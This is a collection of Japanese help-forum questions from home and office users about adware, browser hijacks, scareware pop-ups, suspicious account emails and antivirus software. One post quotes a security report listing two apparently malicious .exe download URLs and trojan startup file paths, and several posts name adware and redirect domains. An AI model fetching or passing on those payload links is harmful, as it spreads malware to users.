ここ数日PCの動きがとても遅いです。 OSはwindows7, ブラウザーはIE9です。 例えば、デスクトップに置いてある３０k程度のメモ帳を 開くのも３０秒位かかったり、ネットの動きもとても 遅いです。Yahooでキーワードを入れて検索をしても、 結果が表示されるまで３０秒はかかります。 またネットを使っている時に、勝手に別のブラウザーが 立ち上がり、ght.tooldiv.net というURLが最初に表示され すぐに別のサイトが開きます。 マカフィーを使って、PC全体のウイルススキャンを実行しましたが、 怪しいファイル等は何も検知されませんでした。 また２日前にリカバリー(OSからの再インストール)をしたばかりで、 かつフリーのスパイウエア検知ソフトをインストールし実行しましたが、 解決しません。
Lyricsediterを使っていてLRCを開きついインストールしてしまいました。WinampSuperlyricsです。アンインストールできません。どうすればいいですか？
PC上で大きさを測るフリーソフトというのを探していまして 「PixelWindow」というものをインストールする際に チェックボックスを外し忘れたのか、 「hao123」「Reg clean pro」というものがインストールされてしまいました。 名前で検索したらどちらもちょっと悪質なものみたいで、 以下を参考に削除しました。 「hao123」http://yossense.com/hao123_uninstall/ 「Reg clean pro」http://www.geocities.co.jp/Playtown-Yoyo/6130/no … 削除し終える事ができたのですが、 まだPCの挙動がおかしいような気がします。 （良いPCではないので以前から重めではありましたが、前よりも重くなったような気がする） ブラウザはchromeです。 ウイルスバスターでスキャンしましたが、ウイルス等は検出されませんでした。 タスクマネージャーで不審そうな名前のものを検索したりしましたが 怪しいものはなさそうでした。 再起動にかなり時間がかかったり chromeを立ち上げたら拡張機能が消えていたり タブ4ページ分でCPU50～70%になったり といった程度なのですが・・・ PCのスペックは以下です。 Celeron CPU　B800 1.5Ghz 1.5Ghz メモリ4Ｇ Windows7 64bit 私レベルではこれで大丈夫なのか判断がつきません。 挙動が少し重いので、検索にひっかからないマルウェア等入っていないか不安なのですが、 PCに詳しい方いらっしゃいましたら対処法など教えて頂けませんか？
　今朝、自分のノートパソコンにてlive doorのいろんなニュースをみて そのあと、娘のKORGのKEY37キーボードをこのパソコンにつなぎました。 　KORGのソフトがインストールされたと思い探しましたが それらしいものがみつからず、ほぼ同時刻にOS Cにインストールされた ADW　SENSAVEなるものをみつけたため、ためしにセキュリティソフトでスキャンしてみましたら ウイルスソフトとして削除されました。 　このADW　SENSAVEとは悪質なものなのでしょうか？ また感染源は何が考えられるでしょうか。
Firefoxを使用していますが、1週間ほど前からとあるHPが勝手にタブで開くようになりました。 先日間違ってインストールしてしまったhao123に付属した？マルウェアだと考え、 ・hao123を完全に削除 ・Firefoxを再インストール ・Cookieで「worldo・・・」に関連する全てを削除 ・「悪意あるソフトウェアの削除ツール」をマイクロソフトよりダウンロードして検索→異常なし と色々対応しましたが、未だにタブが勝手に表示されます。 どうすればよろしいか教えてください！
IEの脆弱性の問題で、GOOGLEに切り替えたのですが、Yahooのログイン画面に自分のIDが自然に（２文字くらお入力すると）出てくるようになりました。コントロールパネルのインターネットオプションでは最高のレベルにしてあるのですが。また、Yahooのメールの箇所も一度ログインすると、シャットダウンしてまたwindowsにオンしてもその「メール」という文字が茶色表記になっています（これって前回の履歴が残ってることなんでしょか？）インターネットのオプションでは毎回履歴を消すようにセットしてますし、手動で履歴を消去しても、この茶色表記が変わりません（ほかの文字のように黒表記にならないということです）。せっかくgoogleに変えたのにこっちのほうがセキュリティーが悪くなってしまったように思います。どうしたらセキュリティーを回復できるのでしょうか。よく知ってる方、教えてください。お願いします。
最近、企業や国家に個人情報を共有されたくないので、個人情報を抜いたり通信を追跡することの先駆者的な存在であるGoogleのサービスやアプリを使うことをやめました。しかし、検索だけは他のものでは満足できず代用がききません。 そこで、Cookieを仕込まれたりせずにGoogleの検索結果を見る方法を探しているのですが見つかりません。ブラウザにDisconnectを入れてgoogle.co.jpにアクセスしてもDisconnectは反応しません。個人情報を抜かれずにGoogleの検索結果を見る方法があれば教えてください。
自動更新に設定しているのですがいまだプログラムが更新されません。 もう少し待って自動更新されるのを待ったほうがいいのか手動でインストールしたほうがいいのか迷っています。 早々の回答お願いします。
firefox、DuckDuckGo ghosteryについて 今までブラウジング上のセキュリティはほぼ放置状態だったのですが 1週間前ほどから出来る範囲で対策を行っています。 使用しているブラウザはfirefox（メイン）とSRWare Iron（サブ）です。 そこで、DuckDuckGoを使用してGoogleへの情報収集を避けようとしたのですが どうも検索結果や使い勝手が自分には合わず、正直グーグル検索が一番 自分にはあっているようです（使用歴も長いからだと思いますが） 現在、ghosteryもインストールしていて 基本的に表示された検出結果は全て無効にしています。 もしかして、ghosteryをこのように使用していれば DuckDuckGoを使用せずとも、情報収集はされないのでしょうか？ もし収集されるのであれば、DuckDuckGoを使用せず グーグル検索を使用する上で何か対策はあるでしょうか？ 回答お待ちしております。
法人でインターネットバンキングを利用している経理担当者です。 銀行のホームページからPHISH CUTをダウンロードして使用しています。 ある時、会員制のサイト（楽天、アスクル等）へID,パスワードを入力してログインしようとすると、PHISH CUTのメッセージとして「○○銀行のWEBバンキング」の「重要情報」を 正当性が確認できないサイトに送信しようとしています。送信を続行しますか？（０３８） というのが表示されます。 今のところ不安なのでログインが必要なサイトへでの購入は控えています。 何か大きな問題（パスワード読み取り等）が起こる可能性はありますでしょうか？ また、何か対応策はありますでしょうか？ ご存知の方、どうか教えて下さい。
連投で　すみません。 ブラウザを変えたら、Adobe Flash Playerを入れなおさないと動画が見れなくなったようで、もう一度ダウンロードすることにしました。 ところで、セキュリティソフトは　マカフィじゃないとダメなのですか？ ノートンを入れてしまいましたが、Adobe Flash Playerをダウンロードしようと思ったら、 マカフィの表示が出ました。 チェックを外せば、ノートンでも使えるのでしょうか。 もしそうであれば、 >注記: ウイルス対策ソフトウェアでは、ソフトウェアのインストールを許可する必要があります。 これは、ノートンにもAdobe Flash Player　の使用を許可する必要があるということですか？
富士通のノートPCを父が使用しています。 スタートアップ時に http://bcd9.aiemxie.info/qg/GhBSH0X-FvV4Xk8mQLhu … というウインドウが毎回出てきて、これを消すことができません。 Windows7を使用していますが、どういうわけか、スタートアップのフォルダを表示することができませんでした。（隠しファイルなども表示する設定にしてありました）。 このウインドウを表示させない方法、または根本から削除する方法が分かる方がいたら、ぜひご教授ください。 宜しくお願い致します。
Nortonの無料版をダウンロードしてYahoo!をホームにしてから、このサイトがすごく重いのです。他のサイトはサクサク検索できます。 Nortonをダウンロードする前にMSEをアンインストール済みです。 IEがデスクトップにそのまま残してありますが、消去した方が良いのでしょうか？ それとも何かが原因でしょうか？
１．WIN7でIE使用なら大丈夫でしょうか？ それとも駄目？ ２．IEを使用してる環境で、悪意のあるサイトを閲覧するとコードが仕込まれちゃうの？ それとも、IEを立ち上げただけでコードを仕込まれる可能性があるのか、どっちでしょうか？ 以上よろしくお願いします。
１年前ほどからPCにスパイウェアが入ってきていましたが、あまり使用しないのでずっと放置していました。しかし、１ヶ月ほど前にあまりにも状態がひどかったので、ウインドウズOSを再インストールしました。再インストール後、数日はよかったのですが、またすぐにスパイウェアが入ってきました。 困ったので、先日ようやくウイルス対策ソフトを嫌々ながら購入し、点検してみると、約50種類近くのウイルス、スパイウェアと思われるものに感染していました。（汗 いくつかはそのソフトで削除されたのですが、大半は「削除できません」という表示がでます。 このような経緯であり、どうにかしたいのですが質問としては (1)１ヶ月ほど前にOSを再インストールした時に、ウイルス、スパイウェアは削除されなかったのか。 (2)削除できないウイルスを手動で削除するのは大変手間になりそうなので、１度PCを完全に初期化したいが、どうすればいいのか。（簡単にできるとうれしいです） ちなみに、 OS:windows7HomePremium64ビット（CD１枚） PCは10年ほど前に自作しています。（メモリ4G 3.16GHz) たいしたデータは入っていないので、バックアップなどは不要です。 （パスワード関係は別途メモしています。） 自作しているといっても、金策で本見ながらなんとか制作しており、基本的にはあまり知識は豊富ではありません。むしろ苦手分野です。 非常に恐縮ですが、なるべくわかりやすく説明していただけると助かります。 どうかよろしくお願いします。
心あたりがないのに、次のようなメールが届きます。放っておいていいでしょうか、成りすましとか、メアドが盗まれそうなんでしょうか？ Microsoft アカウント プロファイル情報が変更されました お使いの Microsoft アカウント y*****@hotmail.co.jp の氏名、生年月日、国/地域などのプロフィール情報が変更されました。 お客様がこれを実行した場合は、このメールを無視しても問題ありません。 お客様がこれを実行していない場合、悪意のあるユーザーがお客様のパスワードを使っています。最近のアクティビティをご確認のうえ、手順に従って必要な対策を講じてください。 最近のアクティビティを確認する セキュリティ通知を受け取る場所を変更するには、ここをクリックしてください。 サービスのご利用ありがとうございます。 Microsoft アカウント チーム 最近のアクティビティを確認する前に　次のメールで Microsoft アカウント パスワードが変更されました たった今、Microsoft アカウント y*****@hotmail.co.jp のパスワードが変更されました。 お客様がこれを実行した場合は、このメールを無視しても問題ありません。 お客様がこれを実行していない場合、お使いのアカウントが不正に使われています。以下の手順に従ってください。 パスワードをリセットします。 アカウントの安全性を高める方法をご確認ください。 セキュリティ通知を受け取る場所を変更するには、ここをクリックしてください。 サービスのご利用ありがとうございます。 Microsoft アカウント チーム メアドを変えられてしまったので、最近のアクティビティを確認する」こともできない。何があったのだろうか？
左下にへんな戦車のゲームやウイルスに感染しましたなどフラッシュが出てきて煩わしいです。 CCleaner使いましたがだめでした。 どうにか消す方法はないでしょうか
最近ウィンドウズＸＰを再インストールしました。 ＩＥ8に変更してインターネットを見ているとやたら変なものがポップアップしてきます。 添付のようなものです。 これを出ないようにするにはどうしたらよいでしょうか？ よろしくお願いします。
数日前からネット画面の右左や空いたスペースにスパイウェアらしき広告が常に出てきて目障りっです 調べると普通にアンインストールするだけでは削除できないと書いて有ります 実際そうだとしてどうやって削除すればよいのでしょうか？ またネットサーフィンするたびにUniblue　Speed　Up　My　PC2014というバーが現れます 画面の端っこにMicrosoft　PartnerとかMcAreeなど書いてまります これもスパイウェアだと思いますがどうやれば削除できるのでしょうか？
PC（XP）をセキュリティーソフトで検索した結果、表題のアプリケーションが、 C:\Documents and Settings\ユーザー名\Application Data に存在します。 プロセス名は、wprotectmanager.exc　会社名は、 CHERISHED TECHNOLOGY LIMITED http://www.worldbox.net/company/cherished-techno … 香港にある会社で信用調査のような会社のようです。 プロセス名、pluginservice.exc も存在します。 アドオンでもなさそうです。正体不明で削除していいものか？どうやって削除するのか分かりません。ご存知の方、お教え下さい。
ネットに接続されたＰＣに接続したUSBメモリに保存していた大切なデータが改ざんされ、使用不能になりました。今後、このような状態を防ぐには、(1)メールアドレスとパスワードの変更（最適な）がかかせないと思いますが、どのように構築すれば良いですか。どなたか教えてください。また、一番良いのは、ネットに繋がないのが良いと思いますが、OSやアプリなどネットに常時繋がないと使用できないのです が、(2)大事なデータが入っているUSBメモリを使用するときは、ネットを遮断するだけで大丈夫でしょうか？(3)セキュリティソフト（カスペルスキー 2014 マルチプラットフォーム セキュリティ 1年プライベート版）をしようしていますが、侵入されてしましました。通常のセキュリティソフトでは防御できませんか？
主な、セキュリティソフトに、Anti-Malwareソフトは必要でしょうか？ SUPERAntiSpyware Malwarebytes Anti-Malware Emsisoft Emergency Kit Free （Emsisoft Anti-Malware） などありますが、思うのですが、必要でしょうか・・・。 その際、常駐型（有料）か、非常駐型か、どちらがいいんでしょうか。 よろしくお願いします。 Windows 7 64Bit カスペルスキー入れてます。
下記症状になりクリーンインストールする予定ですが、書き換えられているかもしれない所も 元通りになるのでしょうか？ OS:Win7 インストールソフト 　ウイルスバスタークラウド2012 　office Personal 2003 かんたん会計（ミロク情報サービス） 　印刷どうラク！伝票印刷３（ヒサゴ(株)） 　筆王select2013 　エアステーション（バッファロールータ） 　その他canon等の接続機器のソフト 子供がインストールしていたもの 　マインクラフト（ゲーム） 　Terraria(ゲーム) 　スカイプ（マイクロソフト） 　steam(Trraria等の配布物購入の為のクライアント) CATVのルータに有線でバッファローのルータ接続　更に有線で(1)のPCを接続　(2)のPCは無線 バッファローのルータはセキュリティ設定で暗号化とパスで接続の許可をルータ側とPC側でしています 子供がやってしまった事 　マインクラフトの公開サーバー設定の為のIPアドレス設定等を自動化してくれる所に2回登録 　どれも出来なかったとの事 　マインクラフト用の非公式配布ツールを入れた 　YouTubeを見た 症状3月29日になりLANを外した デスクトップのショートカットが削除されていた ゴミ箱内のファイルが全部消えていた 復元ポイントも消えたいた IEの履歴が消えていたのでどこをどう見たのか確認できず IEを起動したら真っ白でインターネットオプションを見たらHPのURLがabout: blankになっていて IEが既定になっていないとあったので、変更して適用を押したがIEを起動したら同じ事になる 知らないソフトが5個インストールされていた YAC Oxy PileFile downloader Win Zipper Desk365（ファイルをクリーン削除するソフトのようです） アンインストールでも消せないソフト「Oxy」「PileFile downloader」両方とも発行元が「LADY'S WOOD 2013 LIMITED」レジストリから削除してフォルダも削除 ウイルスバスター反応せず。検索でも無し。セキュリティレポートでweb脅威が3月18日48件・3月28日7060件 ウイルス・スパイウェアの所には3月13日2件・3月18日2件・3月28日16件とあるがファイルが削除されていて詳細は確認できず ４月２日にLANを繋いで見た所、web脅威があっという間に増える その時のレポート内容アドレスは下記２件のみ http://Anonload.com/uploads/1837934081.svcom.exe http://Anonload.com/uploads/1072229070.pc.exe アンインストール・レジストリ削除・隠しフォルダなどほぼ削除出来た時に「コンピューターへの変更」のお知らせなく新たにソフトがインストールされた Fセキュアオンラインでも検索。何も無し。他も検索しても何も無し。 SpyBot入れて検索。重要でマルウェアが6件 ウイルスバスターサポートからのメールを見る為に、起動した時かメールを見た時か定かではありませんがウイルスバスターのリアルタイムスキャンが反応 2014/4/2 17:05 TROJ_SPNR.06D214 脅威　C:\Users\owner\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\intelupdate.lnk 削除 2014/4/2 17:05 TROJ_SPNR.06D214 脅威　C:\Users\owner\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\wingui.exe　再起動して下さい ウイルスバスターのサポートを受け半日以上かけ提供されたソフトで検索するが無し 症状を伝えると書きかえられた箇所が残っている可能性があると言われ クリーンインストールで完全に直るのか？BIOSとか元に戻るのか？子供がやってしまった公開する為の登録でルータのIPアドレス設定が別に作られていたりしないか？もしそうなら、そこも直るのですか？と聞いたのですが回答を得られず。 マルウェアやスパイウェア、ウイルスでなっていたら分からないので１番聞きたかった事なので教えて下さい。 分からずに未だクリーンインストール出来ないでいます。大丈夫でしょうか？ あと無線で繋いでいる(2)のPCではウイルスバスターのセキュリティレポートには何もありません。 (2)には何も入ってきていないのでしょうか？(1)のPCに問題があった前後を含め、電源は入れていなかったです。
公式サイトのダウンロードページ http://www.imgburn.com/index.php?act=download の Mirror 7 - Provided by ImgBurn から SetupImgBurn_2.5.8.0.exe　をダウンロードしました。 ImgBurnインストール途中で表示される　 hao123、speedUpMyPC 2014 はインストールしないように注意して ImgBurnのインストールを完了しました。 hao123、speedUpMyPC 2014さえインスールしなければ、ImgBurn自体は安全なのでしょうか？
yahoo japan　の、アドレスの右側にLinkeyのマークがあって、クリックすると、Linkey特有のサイトが現れます。adwcleaner と spybot をやってみましたが取れません。削除方法をご教示お願いします。また、この「Linkey」は、どのソフトにくっついてくるのかがわかれば、それもご教示お願いします。
つい先日から画像のようなポップアップが出てくるようになってしまいました。 ChromeでTwitterなどを開いた際も、上部に白い広告で「Ads by Media Watch --- Ad Options」と表示されています。 ウェブページ上のリンクを開くと、「Media Player - 無料でダウンロードできます。」「コーデックはパフォーマーの更新を推奨します。」という謎のコーデックのダンロードをほのめかすポップアップが表示され、大変困っています。 そこでコントロールパネルからプログラムのアンインストールを見ると、「Media Player」という見覚えのないプログラムがあったので、アンインストールをしました。しかし、その際に「すでにアンインストールされています。プログラムの欄から削除します。」かのようなメッセージが表示され、それ以来プログラムの欄から「Media Player」は無くなってしまいました。その後もポップアップ広告は表示されるままです。 何らかのアドウェアやスパイウェアなのでは無いかと心配です。 駆除する方法を教えて下さいm(__)m
スクウェア・エニックスアカウントからアカウントがゲームアカウントとして使われていますのでホームページに入ろうとすると、ウィルスソフトにてブロックされますが、そのお知らせは、本当なのでしょうか？
xn--u9jzna1342aodkik9egbf.netというドメインで内容があやふやなメールが来ます。 このドメインはなんなんでしょうか。 ご存じの方教えてくださると助かります。
Norton Internet Securityをインストールしたが、 ブラウザーを開いていると勝手にタグを追加して開きタグがたくさん増えて いろいろなサイトにつながります。これを解決する方法を教えてください。
Androidスマホを使い初めました。 Xvideoにあるファイルのどれくらいが【ウィルス対策アプリで検知出来ないウィルスやスパイウェア】が付いていますか？ スマホではダウンロードしたことはありませんが、タブレットではダウンロードしまくりました。 （グーグルプレイ内にある）怪しいアプリもインストールしたので、原因は分かりませんが、なぜか今まで無かったのに、グーグルプレイのマイアプリの一部アプリ（グーグル系アプリばかりか、多かったような気がします。）が、勝手にアップデートを始めました。 なぜか勝手に再起動が始まったりして、挙動不審な感じです。 ウィルス対策アプリの端末スキャンでは、問題なしと通知されますが、 ウィルス対策アプリに検知出来ないウィルスが付いていた可能性もありますよね？ アプリはグーグルプレイかAmazonアプリstoreで（アプリは無料のもののみ）、コンテンツのほとんどはXvideoからくらいしかダウンロードしていないと思うので、一番怪しい所がXvideoなんですが、Xvideoではどれくらいの割合でウィルス対策アプリに検知出来ないウィルスやスパイウェアが付いていますか？ また、検知出来ないものを検知するには、どのようにしたら良いでしょうか？ あと、グーグルプレイ運営部は、アプリの審査・ウィルスチェックや不正権限（対象アプリに不要と思われる権限）の有無のチェックなど、やっているのでしょうか？ （基本的に安心安全なサイトのイメージがありますが、実際はザルなのかな？）
以前に知り合いが家にきて、私が3分ほど席を離れている間に起動中のMacからもしかすると何か情報を見られ、PCに侵入されるのではないかと、最近急に不安になってしまいました。(確証も実害も今のところないので可能性としてはあまり高くないのかもしれませんが) ただ、その該当のMacはサブマシンでほとんど使用しておらずメインは別にあるのですが、 ネットについては有線で同じ線を使っており(ただ、線は1本のみなので同時に接続はできません)、 そういった場合でもサブマシンから得た情報などでメインマシンにも被害が及ぶ可能性はあるのでしょうか？ ひとまず初心者ながら2台ともに以下の対処をしましたが、 やはり不安が消えません。 ・Macのファイアウォールを「入」(一番強い設定) ・ESETのCyber Security proの体験版をDLして検査(※異常はありませんでした) ・ログインパスワードの変更 ・共有設定のチェックを外す ・ソフトウェアをアップデート 他に効果があるのか定かではないですが、30分に一度程度でネット接続を細かく切る、 寝る時や出かける時は線を外しておくなどしています。 また、現在どうしてよいのかわからずファイアウォールが、MacのものとESET Cyber Security proのものの2つ共を「入」にしてしまっているのですが、こういった場合どちらのファイアウォールを使用した方がセキュリティ上高い効果を発揮できるのでしょうか？ 有効な最終手段としてはmacを2台ともリカバリすることなのかと思いますが、 現在のデータをどこかにバックアップしてそれをリカバリ後のmacに戻した場合 結局もとの状態(何か疑いのあるデータ等が混じっている)に戻ってしまわないか、という心配もあります。 大分考えすぎてしまっているのは理解しているのですが、 極端な話新しいMacを購入しネットも新しく契約をしなおしても該当のMacから 以前のデータをUSB等で移した場合にアウトなのであるとかなり辛い部分があり、 この問題に対して他に出来うる対策やご意見などありましたら ご教授いただけると大変助かります。 以上、何卒よろしくお願いいたします。 (使用MacはサブはOS10.7、メインはOS10.6)
WINDOWS　8のOSを　使用していますが　家族の誰かが　アダルトサイトへ　アクセスしたらしく サイトから請求が貼り付けられてしまい　消すことができません　システムの復元で　消去できてた ようだったのですが、１日経過して　パソコンを立ち上げると　また貼り付けられています。 家族共同でしようしている　PCですので　多感時期の娘を持つ　親としては　この状態を放置する わけには　いけません　どなたか　同じような経験をされた方　いるかと思います。解決方法を ご教授いただけないでしょうか？サイト名が　candy　と表示されています。非常に困っています。
最近ノートPCに変な音声が発生しました。「お使いのパソコンの性能が低下しています。」と その後に「スパイウェアが侵入しています。」などという広告が何度でも出ます。 初心者なもので削除方法がわからず困っています。削除方法を教えて下さい。 これはもうウイルスに感染したのでしょうか？ また、ウイルス対策ソフトはどこのメーカーが良いのでしょうか？ ずうずうしいお願いですが症状の対処方法わかりやすく教えていただけると助かります。
あと○○日で終了しますというサインがでたので、Ａｖａｓｔ Ｐｒ Ａｎｔｉｖｉｒｕｓをアップグレードして購入しインストールをしましたが、その後も「あと13日で終了します」というサインがでます。 何故でしょうか？
パソコンを操作中にAVGのウイルスセキュリティソフトがトロイの木馬を検出しました。 すぐに隔離しました。できない奴は除去しました。 そこまでは良かったのですが、数日後にまたトロイの木馬が発見されました。 そしてこれが繰り返し続きます。 復元をしようかとも思ったのですが、なぜだか復元ポイントがなくて復元は使えませんでした。 自分ではどうしようもなくて困ってます。 解決策がわかる方いましたら教えていただけると助かります。 初心者ですのでわかりやすく教えていただけるとありがたいです。
インターネットの画面に「警告」「注意」「Attention」画面が現れて、閲覧を妨害しています。ウイルスの可能性が高いと思いますが、これを駆除する方法を教えて下さい。
変な広告が出てきて困ってます。 どんな広告かと言いますと、具体的には『スパイウェアが侵入しています』などという広告がパソコンを起動してから最低でも一回は出ます。 http://wrapper.z5x.net というURLは制限付きサイトに登録していても関係なく出てきます。 AVGやad-aware、その他沢山のウイルススキャンソフトを試してマルウェアが４つ見つかりまして、隔離したのですが、、、 そのあとも同じようなのが見つかるようになりました。 見つからない時もありますが、それでもポップアップ広告は出てきてしまいます。 色々自分なりにやってみたのですが直りません。 非常に困っています。どなたかこの症状の対処法わかる方いましたら教えてください。 ずうずうしいお願いですが、初心者のためわかりやすく教えていただけると助かります。
いつも質問の際のアドバイス回答も有難うございます。 又疑問点が発生致しましたので宜しくお願いいたします。 Spybot Search & Destroy 2.2を使用させていただいておりますが、検出されたいくつかの脅威の詳細が表示されますが、その後どのような処理を行えば良いのでしょうか？ 関連サイトを探してはみましが、相当するものがなかなかない次第です。
今まで問題なく開いていたページなのですが、最近「Rivers.pro」（Mypageresults.com）という海外のサイトにジャンプするようになってしまいました。 一瞬元のページが移ったあとに、そちらのサイトに飛ばされます。 先日海外サイトを閲覧していたので、変なウィルスかなにかを拾ってきたのだと思います・・・。 削除するためにスパイウェア駆除ソフトやavastなどでチェックしているのですが一向に直りません。 検索しても削除法がよくわからず、途方にくれております。 解決法をご存知の方がいらっしゃれば、ぜひ教えてください。 よろしくお願いいたします。
Windows7を使っているものです。 isoの変換フリーソフトインストールしたら勝手にデスクトップに他会社のセキュリティの広告がでました。 そこでカスペルスキーの機能でアドウェア2件検知し、よくわからなかったので削除しましたが、削除の選択でよかったのですか？ その後フルスキャンで脅威なしだったので念の為にコンピュータを以前の状態に復元しましたが、アドウェア程度ならリカバリーの必要はないですよね？ セキュリティについてど素人な者です。 カスペルスキーインターネットセキュリティ2012で3年版を購入し、あと約２年残ってるのですが、インターネットセキュリティ2014と機能は変わらないですか。 古いような気がして不安です。 なにか違いはあるんですか。 そして次に更新しても2012のままですか。
　パソコンについて基本的なことに無関心だった為セキュリティについて教えて頂きたいのですが、 　現在デスクトップとノートパソコンとスマホを利用していて、　スマホは一応ウイルスバスターとか利用しているため大丈夫だと素人判断で思っているんですが、 　デスクトップはウイルスバスターやマカフィー（？）で2～3年契約で利用。一応いいのかな？という対応です。　 　　問題は自身の購入して良く使うノートパソコンなんですが 、一応デスクトップと同じ回線で利用しているのですが、ノートンをノートに利用していたんです。 　で、その期限が来てるぞと警告がでて、　ああ更新か～と画面に入力する際 　メールアドレスが、　相手から送信して届く、（ノートパソにも）ノートからでもデスクトップのメールなら送信可能なメールがデスクトップと同メール　　　すみませんややこしい 　　一方ノートパソコンではouｔlookでいつも利用していて、そこでメルアドを作ったんですが 　送信可能でも相手からそのメールでは送信しても受信されないんです。 　　なにをどうしたのか自分でもわからないのでほっといたんですが 　　セキュリティでノートンにメルアド送信する場合送受信可能なデスクトップのメルアドを利用すればノートパソコンも大丈夫なんでしょうか？ 　　ノートパソコンのメルアドが送受信可能にする方法って簡単にできる方法教えて下されば幸いです。　　パソコンセキュリティーについて簡単にわかりやすい本とかブログ、サイトとかあれば 　教えて下さい。
質問の際はいつもお世話になります。 早速ですが、spybot2 スパイボット2でブラウザをインターネットエクスプローラーとgoogle chromeの両方を設定したい場合、設定画面→ポータブルブラウザの次の作業はどうしたら良いのでしょうか？ ご存じの方、是非アドバイスをお願いいたします。
最近パソコンのホームページで設定していたものが他のホームページに変わってしまいます。 現在のIEは９です。 ウィンドウズアップデート、更新プログラムからIE９をアンインストールしようとしたところエラーがでてしまいアンインストールできません。 修正プログラムを実行してウィザードからFix itで問題解決を試みたのですが、どうも理解できなくて前に進めません。 簡単にアンインストールできる方法はないのでしょうか。 またホームページが変わることを防止する方法がありましたら教えてください。
はじめまして。 PCについて本当に弱く、どうすればいいのか全くわかりません。 易しい言葉で教えていただけると大変助かります 昨日、フリーゲームのダウンロードをしたところ、その直後からウィンドウを開くとポップアップがでるようになりました。 ポップアップには下部分に「advertisement」と書かれてあります。 検索して対処法を調べ、原因とみられるファイルやアプリをアンインストールしたのですが、消えません。 そこで、同じような質問の回答に書いてあったスキャンを試しました ・SUPERAntiSpyware これで一度スキャンをしてみると、アドウェア？というものが大量にでてきました そしてこのツールで削除も出来るようでしたのでそのまま削除したのですが、広告は消えず… 次に ・カスペルスキー の無料スキャンでスキャンしたところ、感染が確認されました(画像) 普段のスキャンなどはアバスト！を使っています マルウェアの削除法を書いてあるサイトもいくつか拝見したのですが、難しくてよく分からないです… このようなものはどう対処すればよいのでしょうか？
パソコンにスパイなどが入ってもすぐ活動させない様にしたいんですが、 通常パソコンにはCドライブとDドライブがありますが、外付けのHDDにデータをおくるのでなくパソコン内のDドライブに送る方法はウィルスがドキュメントなどから悪戯する対策になるのでしょうか？ あと、トラブルなどの対策の為に、パソコン本体と同じシステムなどを全てクローンしたHDD(これを外付けHDDとして使用する)、ドキュメントなどに感染したウィルスがあると動作するとの事でしたが本体と同じシステムが入ってるHDD(本体と同じクローンしたHDDを)へウィルスの疑いがある(気づかない)データを移動しても大丈夫なのでしょうか？ パソコンにスパイなどが入ってもすぐ活動させない様にしたいんですが、他に何かお勧めな設定はありますか？スパイやウィルスはWi-Fiにて移動させた脅威は本体のパソコンに悪戯出来るのでしょうか？(キーロッガーなども) 宜しくお願いします。
「スパイウェアを検出しました」がどうしても消すことができません。Google Chromeの拡張機能を調べましたが、yontooや他の怪しそうな名前のものはアドオンされていないようです。 ネットで調べて「IObit Uninstaller」を使いましたが、これも同じく怪しいものは見つかりません。 コントロールパネルのアンインストールでも探しましたが、それらしきものは見つかっていません。 他に方法があれば教えてください。 大変困っています。
小さな会社ですが総務全般を行ってる女性です。 雑貨などの販売会社なので勤務中にいろいろネットで調べ物をします。 その際、他の従業員が、私のパソコンを見てる人がいる気がします。 そんな事って可能なのでしょうか? 仕事で調べてるものなので、見られて良いのは良いのですが、 他の人に見られてると思うと、気分が良いものではありません。 LANでつなげてるので、作ったエクセルデーターとかワードにPDFなどを 見られるのは良いのですが・・・。 ・・・というよりみんなで見れる用のフォルダーを１つ作ってそこで共有 できるようになっています。 私が一番嫌なのは、サイトにアクセスしてる、その内容をリアルタイムか、 後からでも見られるのが嫌なのです＞＜ 例えばブログを書いてるとき、その内容などがLANで繋がったほかのPCで 見る事は可能ですか? もし見られてるとしたら、私の使ってるパソコンになんらかの設定を しなければならないと思うのですが、どこを見れば、それがわかりますか? それと・・・その対応（設定を変える）などが分かればありがたいです。 状況は・・・ 会社のパソコンはLANケーブルで繋がっています。 ウインドウズ2013です。 台数は私を含めて5台がLANで繋がってる状況です。 一応インターネットオプションから履歴の削除などは設定済みです。 よろしくお願いいたします。
映画館の情報を得ようとしている過程で、うっかりと標記のファイルをインストールしてしまいました。もしかすると危険なものかも知れないと思い、不安を覚えます。このファイルについての情報をお持ちの方からのご意見を賜りたく、どうか宜しくお願い致します。
Delta searchがしつこいです アンイストールも、Googleの設定から消してもすぐに復活するし、IEにもfirefoxにも無いのにまた復活してきます。 あとはどこから消しさればいいのでしょうか
自分なりに、調べてみたのですが・・ どうやら情報が古いようで、削除出来ずにいます。 FireFoxを利用しており、アドオンなども全て無効にしても意味が無く・・。 プログラム内にも、それらしいものがなく困っております。 （この手の物は毎回名前を変える等の、書き込みを見たので・・ 名前を変えて紛れている可能性は高いかと思いますが・・） 最近、削除しました！等の方いらしたら、是非教えて下さい。 宜しくお願いします。 （オークションや、ショッピング系サイトを見る度に右側と下側に出てきます）
イーセットでスパイウェアは検出できますか？
マイクロソフトのフリーのアンチウイルスソフト　microsoft security essentialをダウンロードしたのですが、windows defender とは一緒に使えないのでしょうか？ O S　は　WINDOWS 7 PROFESSIONALです。WINDOWS 8 からは最初からmicrosoft security essential がインストールされていてdefender　も組み込まれてあるという事なのですが、自分でsecurity essentialをインストールして、ファイアーウォールも有効にして、ディフェンダーも有効にしようとしたのですが、ディフェンダーは無効のままで有効になりません。 必要無いのでしょうか？教えて下さい。
インターネットエクスプローラを使っています（ウインドウズ７）。 YahooとGoogleをいつも使うのですが、最近、ハイライト表示の見知らぬ変な広告やネットショッピングでチェックした広告が繰り返し出るようになりました。それは、Ads RemarkitやAd Options, Uninlue です。見ていて、強い不快感や目の疲れを感じますので、削除したいのですがその方法を教えてください。 セキュリテイソフトとしては、ノートンを利用していますが、それではチェックされていないようで、安全と表示されます。 どなたか対処法をお教え願えないでしょうか、また対応ソフトがありましたらそちらも教えてください。ネットで見ましたら、無料のソフトもあるように思われますが、無料のソフトは怖くてダウンロードできません。よろしくお願い申し上げます。
「次のプログラムにこのコンピューターへの変更を許可しますか?」という表示が、数十分おきに出るようになってしまいました。もちろん全て「いいえ」をクリックしていますが。 プログラムの名称は「wupdater.exe」というもので、プログラムのある場所はCドライブの「AppData\Local\Temp」でした。削除はするのですが、いつの間にかまたそこに作られていて起動しようとします。プロパティをみると、white sea mediaというところで作られたもののようです。 ウイルス対策ソフトでスキャンしても、スパイウェアの検出ソフトでスキャンしても、特に何も出てきません。ググって見ても、かなり昔の記事が出てくるだけで、あまり参考になりません。 どのように対処すればよいのでしょうか。よろしくお願いします。
某SNSのページ開いたらいきなりこんな画像が出ます。これはスパイウェアですか？どうしたら出なくなりますか？
